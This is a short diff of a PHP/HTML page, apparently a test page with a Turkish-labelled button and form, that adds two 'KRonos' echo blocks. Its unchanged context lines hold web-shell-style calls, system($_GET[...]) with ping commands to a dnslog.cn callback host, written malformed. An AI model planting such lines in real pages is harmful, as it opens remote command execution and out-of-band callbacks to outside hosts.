@@ -12,7 +12,9 @@ system($_GET['cmd ping vfz9zx.dnslog.cn']);
 <?php     
 system($_GET['cmd.exe ping vfz9zx.dnslog.cn']);  
 ?>
-
+<?php     
+echo "KRonos";
+?>
 </div>
 <button type="button">Bu Bir Butondur</button>
 <form action="/action_page.php">
@@ -27,3 +29,6 @@ system($_GET['cmd.exe ping vfz9zx.dnslog.cn']);
 system($_GET['cmd ping vfz9zx.dnslog.cn']);  
 ?>
 
+<?php     
+echo "KRonos";
+?>
